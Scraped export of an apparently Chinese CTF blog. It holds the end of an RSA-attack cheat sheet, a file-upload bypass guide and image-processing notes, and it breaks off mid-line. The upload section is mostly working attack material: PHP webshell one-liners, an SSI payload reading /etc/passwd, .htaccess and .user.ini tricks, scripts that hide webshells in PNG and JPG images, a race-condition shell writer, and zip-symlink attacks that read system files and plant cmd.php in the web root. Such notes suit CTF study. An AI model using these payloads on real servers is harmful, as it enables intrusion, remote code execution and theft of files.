N_i^{\\frac{\\delta}{\\delta_i}},\\delta=\\text{lcm}(\\delta_i) \\quad (i=1,2,\\cdots,k)$ 则SMUPE问题可以在 $O(\\delta^6\\cdot \\log_2M)$ 复杂度解决。 参考：2019红帽杯 - 精明的Alice ​ 反素数（emirp数）已知：$q=\\text{reverse_x}(p)$，$\\text{x}$ 为进制数。 爆破思路类似RSA parity oracle。$p,q$ 是bit翻转关系，已知 $p$ 最低的 $k$ 位，则已知 $q$ 最高的 $k$ 位。 假设已知 $k$ 位的 $p,q$，记为 $ph,qh$，利用不等式 $ph\\cdot qh\\cdot 2^{1024-2k}&lt;=n&lt;(ph+1)\\cdot(qh+1)\\cdot 2^{1024-2k}$ ， 逐位向低地址爆破，不断收缩不等式的范围，最终可求得 $n$ 值。 参考： ASIS 2015 Finals: RSASR Midnight Sun CTF 2020 Quals RoarCTF 2020 - Reverse 1234567891011121314151617181920212223242526272829#python2#x=10n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543def t(a, b, k): # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side if k == 77: if a*b == n: print a, b return for i in xrange(10): for j in xrange(10): # we try to guess the last not-already-guessed digits of both primes a1 = a + i*(10**k) + j*(10**(154-k)) b1 = b + j*(10**k) + i*(10**(154-k)) if a1*b1 &gt; n: # a1 and b1 are too large continue if (a1+(10**(154-k)))*(b1+(10**(154-k))) &lt; n: # a1 and b1 are too small continue if ((a1*b1)%(10**(k+1))) != (n%(10**(k+1))): # The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n continue # this a1 and b1 seem to be a possible match, try to guess remaining digits t(a1, b1, k+1)# the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)for i in xrange(10): t(i*(10**77), i*(10**77), 0) ​ 4p-1 method对使用一类特定素数乘积的模数的分解。 当一类特殊的素数用在 RSA 模数中时，可以轻易的将该素数从 $n$ 中分解出来。由于这一类素数都形如 $4p−1=Ds^2$，因此又被称为 4p-1 method。此外，有些人也会将其视为 RSA 的后门之一，称之为 RSA backdoor。 QiCheng Prime $Ds=\\{3,11,19,43,67,163\\}$ 12345678910111213141516171819202122232425262728import syssys.setrecursionlimit(10^6)def QiCheng(n): R = Integers(n) attempts = 20 js = [0, (-2^5)^3, (-2^5*3)^3, (-2^5*3*5)^3, (-2^5*3*5*11)^3, (-2^6*3*5*23*29)^3] for _ in range(attempts): for j in js: if j == 0: a = R.random_element() E = EllipticCurve([0, a]) else: a = R(j)/(R(1728)-R(j)) c = R.random_element() E = EllipticCurve([3*a*c^2, 2*a*c^3]) x = R.random_element() z = E.division_polynomial(n, x) g = gcd(z, n) if g &gt; 1: return gn = p = int(QiCheng(Integer(n))) Masaaki Shirase &amp; Vladimir Sedlacek Improvement 更多 $Ds$ 值。 CM-based factorization 参考： 浅谈 QiCheng Prime NCTF 2020 - RSA_revenge CryptoHack Challenge - RSA Backdoor Viability ​ Common Prime RSA情形：$\\gcd(p-1,q-1)=g$ 分解的n方法有四种： （1）修改Pollard’s rho方法分解n； （2）知道a、b的值分解n； （3）知道g的值分解n； （4）分解N-1。 12345678910111213141516171819202122232425# Pollard’s rhofrom Crypto.Util.number import *import gmpy2def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 print &#x27;Factorizing&#x27; while True: x1 = getRandomRange(2, n) x2 = f(x1, n) j = 1 while True: p = gmpy2.gcd(abs(x1 - x2), n) if p == n: break elif p &gt; 1 and isPrime(p): print &#x27;Found!&#x27; return (p, n // p) else: x1 = f(x1, n) x2 = f(f(x2, n), n) j += 1 i += 1 参考：Common Prime RSA 笔记 ​ RSA Padding Oracle AttackRSA PKCS #1 v1.5 填充用于需要RSA加密的信息，为了加密K，消息首先被0x00、一些随机字节和0x00 0x02填充，随机字节的选择方式是为了让填充的信息达到特定的块长度（1024、2048或4096位）。 PKCS #1 v1.5 标准中可以伪造RSA签名。 Bleichenbacher攻击 可以识别在 0x00 02 后以明文开始的密文信息，然后进行Padding Oracle攻击来解密预主密钥，进一步可以取得SSL的会话密钥。 充分利用 0x00 02 开头的特性，假设攻击者获得密文 $C_0$，想恢复出明文 $M_0$。攻击方法是通过向服务器多次发送修改后的密文，分析响应是正确还是错误来确定修改结果，进而解密信息。 如果收到正确，则表示是 0x00 02 开头，那么 $2B \\lt m \\lt 3B-1$，且 $B=2^{8(L-2)}$，而且基于RSA加密的延展性，可得 $C=(C_0S)\\bmod N=(M_0S)^e \\bmod N$ ，攻击者可用 $C$ 进行查询，如果收到错误则增加 $S$，并重复上一步骤。 攻击者可以利用 0x00 02 大幅度减少可能的取值，$2B \\lt M_0S-rN \\lt 3B$，因此攻击者能够降低范围$\\cfrac{2B+rN}{S} \\lt M_0 \\lt \\cfrac{3B+rN}{S}$，然后迭代选择 $S$，进行Oracle查询，计算新的 $r$ 值，攻击者便可以不断缩小包含 $M_0$ 的范围，不断重复直到最后只剩唯一解。 参考： Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1 Bleichenbachers “Million Message Attack” on RSA Pwnhub - pkcs_fix ​ Return of Coppersmith’s attack (ROCA)CVE-2017-15361 形如 $p=kM+(65537^a \\bmod M)$ 生成素数的RSA系统，$M$ 是前 $n$ 个连续素数的乘积，$n$ 是仅取决于所需密钥大小的常数。 https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/roca.py https://github.com/FlorianPicca/ROCA ​ PEM密钥由-----BEGIN &lt;TAG&gt;-----开头，-----END &lt;TAG&gt;-----结尾，中间是Base64编码的一串二进制，每64个字母（即解码后的48bytes）有一个换行。中间的Base64解码后是一串遵循ASN.1协议的DER编码，简单来说可以看成一种序列化，把一个结构体中的整数、字串等编码成一个方便传输的二进制。 生成代码： 1234567891011from Crypto.PublicKey import RSArsa = RSA.generate(1024)pk = rsa.publickey().exportKey()sk = rsa.exportKey()with open (&#x27;./pub.pem&#x27;, &#x27;wb&#x27;) as f: f.write(pk)with open (&#x27;./priv.pem&#x27;, &#x27;wb&#x27;) as f: f.write(sk) RSA私钥123-----BEGIN RSA PRIVATE KEY-----...Base64 encoded key...-----END RSA PRIVATE KEY----- RFC3447定义： 123456789101112131415RSAPrivateKey ::= SEQUENCE &#123; version Version, modulus INTEGER, -- n publicExponent INTEGER, -- e privateExponent INTEGER, -- d prime1 INTEGER, -- p prime2 INTEGER, -- q exponent1 INTEGER, -- d mod (p-1) exponent2 INTEGER, -- d mod (q-1) coefficient INTEGER, -- (inverse of q) mod p otherPrimeInfos OtherPrimeInfos OPTIONAL&#125;Version ::= INTEGER &#123; two-prime(0), multi(1) &#125; (CONSTRAINED BY &#123;-- version must be multi if otherPrimeInfos present --&#125;) 例： 13082025d02010002818100a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef02030100010281800f8270c496903bf3e3ec4912450f15edc81cb1fcf4b154615aee11fbd428e64d402b5a8d66d5f770358f3e6df935b324e8d5349c83d7c992a5982249a31734acb1db19c4c8d829267514bc1ef7bbfbe242d4350f67a002a56d33e56d1a94adc71c68f020dc39ab7d0064c111b164e26ba0698dc94a03cdfd516ffd966e877949024100ca97e49c058237f96e99118ce383f91912cba1163de9236181ff754ef3ef1a260fac8d2d9aee866d51a8b6836983b05cf850e786289b6859925bc8695fc67c47024100cb3630aafffcb29607f0833dc7f05c143ee92fadfe975da4cf6719e71226bee72562e8631328a25d7351507a8d43c1295ab6ea242b60a28b109233a983f4211902401b4a32a541a8b4d988a85dd0d8a4e25d1a470bbfef3f0461121dd3337b706dd94aab37a9390180622169d48c071e921733ebd204245c2ac6460ccf0642bc7de90241008d9f44a7c823eaaa58fa2bdd20bcc8cf6b50c463f4acb51ca956e75c7ceff7d7cbdc74aca7ab880cacd39cccec2aae320e00b0896899be6e40ac43c8fe2763f1024100c67ca6d988f53abea82159431a146512a8d942978d4a8f83f2d426f1095e3bf1b5b9b8b1ccbbad2a31c6401880447a45f5e0790269061ac13b5f68f1777d7f07 30是Sequence的tag，82是指接下来后两个bytes是这个Sequence的长度，即0x025d个bytes，也就是剩下全部都是；接着的020100就是整数0，其中02是整数的tag，01是这个整数占1byte，00是value同样的方法也可以解02818100a0...和后面其他整数，拆分： 1234567891011121314151617181920212223242526272829303082025d # Begin Sequence: len=0x025d0201 # Version: (len=0x01)00028181 # n: (len=0x81)00a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203 # e: (len=0x03)010001028180 # d: (len=0x80)0f8270c496903bf3e3ec4912450f15edc81cb1fcf4b154615aee11fbd428e64d402b5a8d66d5f770358f3e6df935b324e8d5349c83d7c992a5982249a31734acb1db19c4c8d829267514bc1ef7bbfbe242d4350f67a002a56d33e56d1a94adc71c68f020dc39ab7d0064c111b164e26ba0698dc94a03cdfd516ffd966e8779490241 # p: (len=0x41)00ca97e49c058237f96e99118ce383f91912cba1163de9236181ff754ef3ef1a260fac8d2d9aee866d51a8b6836983b05cf850e786289b6859925bc8695fc67c470241 # q: (len=0x41)00cb3630aafffcb29607f0833dc7f05c143ee92fadfe975da4cf6719e71226bee72562e8631328a25d7351507a8d43c1295ab6ea242b60a28b109233a983f421190240 # d mod (p-1): (len=0x40)1b4a32a541a8b4d988a85dd0d8a4e25d1a470bbfef3f0461121dd3337b706dd94aab37a9390180622169d48c071e921733ebd204245c2ac6460ccf0642bc7de90241 # d mod (q-1): (len=0x41)008d9f44a7c823eaaa58fa2bdd20bcc8cf6b50c463f4acb51ca956e75c7ceff7d7cbdc74aca7ab880cacd39cccec2aae320e00b0896899be6e40ac43c8fe2763f10241 # (inverse of q) mod p: (len=0x41)00c67ca6d988f53abea82159431a146512a8d942978d4a8f83f2d426f1095e3bf1b5b9b8b1ccbbad2a31c6401880447a45f5e0790269061ac13b5f68f1777d7f07 # End Sequence RSA公钥123-----BEGIN PUBLIC KEY-----...Base64 encoded key...-----END PUBLIC KEY----- 例： 130819f300d06092a864886f70d010101050003818d0030818902818100a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203010001 拆分： 1234567891011121314151617181920212223242530819f # Begin Main Sequence: len=0x9f300d # Begin Sub1 Sequence: len=0x0d0609 # algo_oid: (1.2.840.113549.1.1.1 - PKCSv1.2)2a864886f70d0101010500 # params: (null) # End Sub1 Sequence03818d # BitString: len=0x8d ([n, e])00308189 # Begin Sub2 Sequence: len=0x89028181 # n:00a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203 # e:010001 # End Sub2 Sequence # End Main Sequence 参考手撕PEM密钥 ​ 详细原理二十年以来对 RSA 密码系统攻击综述 CTF Wiki - RSA 0xDktb’s Blog RSA常见攻击方法 Cryptanalysis of RSA and It’s Variants","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"}],"author":"Lazzaro"},{"title":"文件上传","slug":"web-文件上传","date":"2020-05-06T13:13:00.000Z","updated":"2025-04-24T12:44:44.873Z","comments":true,"path":"2020/05/06/web-文件上传/","permalink":"https://lazzzaro.github.io/2020/05/06/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"​ 绕过姿势客户端校验 禁用JS 抓包改包bp抓包后改后缀名 ​ 服务端校验MIME类型检测MIME类型在html文件中使用content-type属性表示。 常见文件名对应的MIME类型： gif —&gt; image/gif，png —&gt; image/png，jpg —&gt; image/jpg，js —&gt; text/javascript，htm/html —&gt; text/html ​ 后缀名黑名单校验绕过方法 大小写绕过，例如 Php/PhP/PHP 利用黑名单中没有的，但是又能够被解析的后缀名，例如 php、php3、php4、php5、php7、pht、phtml、phps 00截断 注：需要magic_quotes_gpc=Off，基于一个组合逻辑漏洞 在第一个后缀名后加一个空格(0x20)，使用bp-&gt;repeater-&gt;hex，将其改成0x00 .htaccess文件上传解析 该文件可以理解为Apache的分布式配置文件，在一个特定的文档中放置，以作用于此目录及其所有子目录。管理员可以通过Apache的AllowOverride指令来设置/etc/apache2/apache2.conf，默认是NONE，需要为ALL 123&lt;FilesMatch &quot;xxx.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMacth&gt; 不能写&lt;?时使用伪协议： 12AddType application/x-httpd-php .xxxphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot; 不能出现某些关键字（如ph或php）时，使用反斜杠（\\）拼接绕过，并开启短标签： 1234567AddType application/x-httpd-p\\hp .jpgp\\hp_value au\\to_append_file &quot;p\\hp://filter/convert.base64-decode/resource=shell.jpg&quot;p\\hp_value short_open_tag 1 绕过 exif_imagetype() 读取一个图像的第一个字节并检查其签名： 12345678方法1：#define width 1337#define height 1337方法2：在.htaccess前添加\\x00\\x00\\x8a\\x39\\x8a\\x39(要在十六进制编辑器中添加，或者使用python的bytes类型)\\x00\\x00\\x8a\\x39\\x8a\\x39 是wbmp文件的文件头.htaccess中以\\x00开头的同样也是注释符，所以不会影响.htaccess 参考： .htaccess的使用技巧总结 .user.ini上传 条件： a. 服务器脚本语言为PHP b. 服务器使用CGI／FastCGI模式 c. 上传目录下要有可执行的php文件 实例： 上传.user.ini绕过黑名单检验 123GIF89a //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg //解析后进行包含 优势： 跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache 超长文件名截断上传 windows - 258byte | linux - 4096byte 使用./或. shtml（SSI注入） 当Web服务器为Apache和IIS（支持SSI功能的服务器）且开启了SSI与CGI支持 &lt;!--#exec cmd=&quot;dir /&quot;--&gt; &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; ​ 后缀名白名单校验 配合Apache的解析缺陷 Apache的解析漏洞主要特性是从后面开始检查后缀，按最后一个合法后缀 ​ 内容头校验 绕过方法 在恶意脚本前加上允许上传文件的头标识 如添加GIF头： 12GIF89a&lt;?php phpinfo(); ?&gt; ​ 竞争上传 情景 文件上传后，检测是否合法，不合法就删除 利用方式 在删除前访问到上传的文件 12345&lt;?php$file = &#x27;web.php&#x27;;$shell = &#x27;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#x27;;file_put_contents($file,$shell);?&gt; 例子 https://github.com/backlion/demo/blob/master/lfi_phpinfo.py ​ php崩溃导致tmp文件保留当存在include的时候，传入file=php://filter/string.strip_tags/resource=/etc/passwd会导致Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除。但是这时还需要知道/tmp目录下的文件名。 ​ 过滤&lt;?或php js标签绕过 需要php小于7.0 12345&lt;script language=&quot;PHP&quot;&gt;$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&#x27;r&#x27;);echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));fclose($fh);&lt;/script&gt; PHP短标签 开启短标签即short_open_tag=on时，可以使用&lt;?=$_ ?&gt;输出变量，在PHP 5.4 之后默认支持 ​ phar反序列化漏洞见phar反序列化。 ​ 二次渲染图片马的三种常用图像格式gif，png，jpg。 简单图片马 copy 1.jpg/b + 1.php/a 2.jpg 二次渲染绕过 gif 对于gif图片，gif图片的特点是无损（修改图片后，图片质量几乎没有损失），可以对比上传前后图片的内容字节，在渲染后不会被修改的部分插入木马。对比工具可以使用burp，也可以使用010编辑器。 png 对于png图片，修改难度大一点，使用一个脚本来生成，原理是通过真实像素的二进制解析写入数据段。 12345678910111213141516171819202122&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;./1.png&#x27;);?&gt; 运行脚本即可生成，这里的一句话木马是： &lt;?$_GET[0]($_POST[1]);?&gt; 使用方式是get传参0，加上post传参1。 jpg 由于jpg图片易损，对图片的选取有很大关系，很容易制作失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;?php $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 运行脚本命令： jpg_payload.php 1.jpg ​ 软链接攻击任意读（unzip）unzip()存在软链接攻击，发现可以通过上传一个软链接的压缩包，把特定文件像个钩子一样勾出来，实现任意文件读取： 123ln -s // linux的软链接 类似快捷方式ln -s /etc/passwd forever404 //会出现一个forever404文本 里面包含有密码/proc/self // 记录系统运行的信息状态 cwd指向当前进程运行目录的一个符号链接 即Flask运行进程目录 链接文件构造一个指向文件 /xxx 的软连接： 12ln -s /xxx linkzip --symlinks test.zip link ./* 上传这个压缩包，访问上传目录下的/link，即可得到/xxx的内容。 链接目录先构造一个指向 /var/www/html 的软连接： 12ln -s /var/www/html testzip --symlinks test.zip ./* 此时上传该test.zip，解压出里边的文件也是软连接 /var/www/html 目录下； 接下来的思路就是想办法构造一个getshell文件让getshell文件正好解压在 /var/www/html，此时就可以getshell。 构造第二个压缩包，先创建一个test目录（因为上一个压缩包里边目录就是test），在test目录下写一个shell文件，在压缩创建的test目录 此时压缩包目录架构是：test/cmd.php。 12345mkdir testcd testecho &quot;&lt;?php @eval($_GET[cmd]);&quot; &gt; cmd.phpcd ..zip -r test1.zip ./* 当上传这个压缩包时会覆盖上一个test目录，但是test目录软链接指向 /var/www/html，解压的时候会把cmd.php放在 /var/www/html，此时达到了getshell的目的。 ​ 只解压一半的压缩包（解压一半出错） Windows 7zip 7zip的容忍度很低，只要压缩包中某一个文件的CRC校验码出错，就会报错退出。 修改方法： 准备两个文件，一个PHP文件1.php，一个文本文件2.txt，其中1.php说webshell，然后将这两个文件压缩成shell.zip。 用010editor打开shell.zip，可以看到右下角有这个文件的格式信息，它被分成5部分，打开第4部分，其中有个deCrc，随便把值改成其他的值，然后保存。 此时用7zip解压就会出错，解压出的1.php是完好的，2.txt是一个空文件。 PHP ZipArchive库 ZipArchive容忍度比较高，可以在文件名上下功夫。 比如，Windows下不允许文件名中包含冒号（:），可以在010editor中将2.txt的deFileName属性的值改成2.tx:，此时解压就会出错，但1.php被保留了下来。 在Linux中也有类似的方法，可以将文件名改为5个斜杠（/////），此时Linux下解压也会出错，但1.php被保留了下来。 例： 123zip ok.zip muma.php 1.txt使用zip将木马和1.txt压缩，然后使用010editor修改1.txt文件名为////。","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://lazzzaro.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Lazzaro"},{"title":"图像处理","slug":"misc-图像处理","date":"2020-05-06T12:56:42.000Z","updated":"2023-12-08T17:40:51.095Z","comments":true,"path":"2020/05/06/misc-图像处理/","permalink":"https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/","excerpt":"","text":"​ Pillow12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#基本操作from PIL import Image #引用Image类im = Image.new(&#x27;RGB&#x27;,(110,80)) #新建图片im = Image.open(&#x27;x.jpg&#x27;) #加载图片print(im.format,im.size,im.mode) #format-格式，size-(宽&amp;高)，mode-模式im.show() #呈现图片im.getcolors() #获取图片信息，一般会返回一个元组(count,(r,g,b))。该元组第一个元素count 代表该颜色像素出现的次数，第二个元素表示(rgb)。im.convert(&#x27;RGB&#x27;).getpixel((0,0)) #获取像素点的RGB值Image.save(&#x27;y.png&#x27;) #保存文件#图片剪切#box是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。假设box是(x1,y1,x2,y2)，则所取区域是以各自坐标划线所围的区域。im = Image.open(&#x27;x.jpg&#x27;)box = (150,150,245,280)region = im.crop(box)region.show()#图片粘贴#将一张图覆盖到另一张图上面。格式为：paste(要贴的图片，要贴的图片的4元坐标组成的区域)。im = Image.open(&#x27;x.jpg&#x27;)box = (50,50,200,200)region = im.crop(box)# 将图片逆序旋转180后，黏贴到原来复制的位置 region = region.transpose(Image.ROTATE_180)im.paste(region,box)im.show()#图像序列#当处理GIF这种包含多个帧的图片，称之为序列文件，PIL会自动打开序列文件的第一帧。而使用seek和tell方法可以在不同帧移动。tell是帧数，而seek是取当前帧数的图片。from PIL import Imageim = Image.open(&quot;laopo.gif&quot;)im.seek(1)im.show()try: while 1: im.seek(im.tell()+1) im.show()except EOFError: pass#读取/修改像素from PIL import Imageimg = Image.open(&#x27;x.jpg&#x27;)width , height = img.sizefor i in range(0,width): for j in range(0,height): tmp = img.getpixel((i,j)) img.putpixel((i,j),(0,0,tmp[2]))img.show() ​ OpenCV21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#图像读入import cv2img = cv2.imread(r&#x27;x.jpg&#x27;,0)#图像显示cv2.imshow(&#x27;tupian&#x27;,img)cv2.waitKey()#图像保存cv2.imwrite(&#x27;tupian,jpg&#x27;,img)#图像属性print(img.shape) #shape 返回图像行数、列数、通道数print(img.size) #size 返回图像像素数print(img.dtype) #dtype 返回图像的数据类型#通道拆分/合并#拆分为B、G、R三个通道#索引拆分B = img[:,:,0]G = img[:,:,1]R = img[:,:,2]#函数拆分B,G,R = cv2.split(img)#合并bgr = cv2.merge([b,g,r])#类型转换#将BGR模式转换为灰度图像，再将灰度图像转换为RGB模式import cv2import numpy as npbgr=np.random.randint(0,256,size=[2,4,3],dtype=np.uint8) #生成2×4×3的BGR图像gray=cv2.cvtColor(bgr,cv2.COLOR_BGR2GRAY) #BGR图像转换为灰度图像rgb=cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB) #灰度图像转换为RGB图像print(&#x27;bgr=\\n&#x27;,bgr)print(&#x27;gray=\\n&#x27;,gray)print(&#x27;rgb=\\n&#x27;,rgb)# 在RGB色彩空间的基础上，还可以加一个A通道，叫做Alpha通道，此时原图像类型转变为RGBA模式，例如常见的PNG类型图像就是RGBA色彩空间的。#分析alpha通道的值import cv2import numpy as npimg=np.random.randint(0,256,size=[2,3,3],dtype=np.uint8) #生成2×3×3的BGR图像bgra=cv2.cvtColor(img,cv2.COLOR_BGR2BGRA)print(&#x27;img=\\n&#x27;,img)print(&#x27;bgra=\\n&#x27;,bgra)b,g,r,a=cv2.split(bgra)print(&#x27;a=\\n&#x27;,a)a[:,:]=125bgra=cv2.merge([b,g,r,a])print(&#x27;bgra=\\n&#x27;,bgra)#傅里叶变换img = cv2.imread(r&quot;x.jpg&quot;,0)# 图像数据要转换成float32img_float32 = np.float32(img)#进行傅里叶变换dft = cv2.dft(img_float32,flags = cv2.DFT_COMPLEX_OUTPUT)# 将低频信息转换至图像中心dft_shift = np.fft.fftshift(dft)# 傅里叶变换后的数据是由实部虚部构成的，需要进行转换成图像格式才能显示(0,255)magnitude = 20*np.log(cv2.magnitude(dft_shift[:,:,0],dft_shift[:,:,1]))plt.subplot(121),plt.imshow(img,cmap = &#x27;gray&#x27;)plt.subplot(122),plt.imshow(magnitude,cmap=&#x27;gray&#x27;)plt.show() ​ Matplotlib123456789101112131415161718192021222324252627#显示图片import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as nppicture = mpimg.imread(&#x27;x.jpg&#x27;) # 读取和代码处于同一目录下的图片plt.imshow(picture) # 显示图片plt.axis(&#x27;on&#x27;) # 显示坐标轴plt.show() #因为idle是pycharm所以多一行显示命令#显示RGB某个通道lena1 = picture*[0,0,1] # 显示图片的一个通道lena2 = picture*[1,0,0]lena3 = picture*[0,1,0]#RGB转灰度def rgb2gray2(rgb): r, g, b = rgb[:,:,0], rgb[:,:,1], rgb[:,:,2] #数组切片 gray = 0.2989 * r + 0.5870 * g + 0.1140 * b return graygray_pro = rgb2gray2(picture)plt.imshow(gray_pro,cmap = plt.get_cmap(&#x27;gray&#x27;))plt.axis(&#x27;on&#x27;) # 